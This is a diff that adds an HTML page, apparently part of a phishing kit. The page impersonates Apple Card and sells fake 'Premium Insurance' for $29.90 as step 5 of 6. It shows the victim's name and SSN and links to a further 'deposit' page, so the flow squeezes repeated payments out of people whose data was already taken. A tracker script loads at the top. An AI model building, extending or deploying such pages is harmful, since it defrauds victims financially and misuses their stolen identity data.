@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<script src="../../tracker.js"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Premium Insurance — Apple Card</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../upsell.css">
+</head>
+<body>
+
+<div class="loading-screen" id="loadingScreen">
+  <img class="loading-logo" src="../../assets/images/black.svg" alt="">
+  <div class="loading-spinner"></div>
+  <div class="loading-msg">Preparing your policy...</div>
+</div>
+
+<div class="page" id="mainPage" style="display:none">
+  <nav class="nav">
+    <div class="nav-spacer"></div>
+    <div class="nav-title">Premium Insurance</div>
+    <div class="nav-step">5/6</div>
+  </nav>
+
+  <div class="content">
+    <div class="hero fade-up">
+      <div class="hero-icon">
+        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+      </div>
+      <h1>Protect your<br>Apple Card</h1>
+      <p>Annual coverage against fraud, loss, theft, and cloning. Immediate refund for unauthorized transactions — no deductible.</p>
+    </div>
+
+    <div class="detail-card fade-up">
+      <div class="dc-row">
+        <span class="label">Holder</span>
+        <span class="value" id="customerName">—</span>
+      </div>
+      <div class="dc-row">
+        <span class="label">SSN</span>
+        <span class="value" id="customerNif">—</span>
+      </div>
+      <div class="dc-row">
+        <span class="label">Policy</span>
+        <span class="value">Premium Card · 12 months</span>
+      </div>
+      <div class="dc-row">
+        <span class="label">Coverage per claim</span>
+        <span class="value success">Up to $5,000</span>
+      </div>
+      <div class="dc-row">
+        <span class="label">Deductible</span>
+        <span class="value success">$0</span>
+      </div>
+      <div class="dc-row">
+        <span class="label">Refund</span>
+        <span class="value success">Within 24 business hours</span>
+      </div>
+      <div class="dc-row">
+        <span class="label">Renewal</span>
+        <span class="value">Manual after 12 months</span>
+      </div>
+    </div>
+
+    <div class="reasons fade-up">
+      <div class="reason">
+        <div class="reason-icon"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg></div>
+        <div class="reason-text"><strong>24/7 fraud monitoring</strong>Real-time monitoring — suspicious transactions are blocked and reversed without you lifting a finger.</div>
+      </div>
+      <div class="reason">
+        <div class="reason-icon"><svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg></div>
+        <div class="reason-text"><strong>Loss coverage</strong>Free replacement card with FedEx Priority delivery at no extra cost.</div>
+      </div>
+      <div class="reason">
+        <div class="reason-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
+        <div class="reason-text"><strong>Online purchase protection</strong>Extended warranty on card purchases · coverage for undelivered items.</div>
+      </div>
+    </div>
+
+    <div class="price-block fade-up">
+      <span class="price-tag">12 months of coverage</span>
+      <div class="price-value" data-price-display>$29.90</div>
+      <div class="price-desc">One-time payment · No auto-renewal</div>
+    </div>
+
+    <button class="pay-btn" id="payBtn">
+      <span class="pay-btn-label">Subscribe · <span data-price-display>$29.90</span></span>
+    </button>
+
+    <div class="trust-line">
+      <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
+      Secure payment · Card · PayPal · Bank
+    </div>
+
+    <button class="skip-link" id="skipBtn">Continue without insurance</button>
+  </div>
+</div>
+
+<script>
+window.UPSELL_CONFIG = {
+  id: 'upsell-seguro-us',
+  title: 'Premium Insurance',
+  price: 29.90,
+  next: '../upp5-caucao/index.html'
+};
+</script>
+<script src="../upsell.js"></script>
+</body>
+</html>
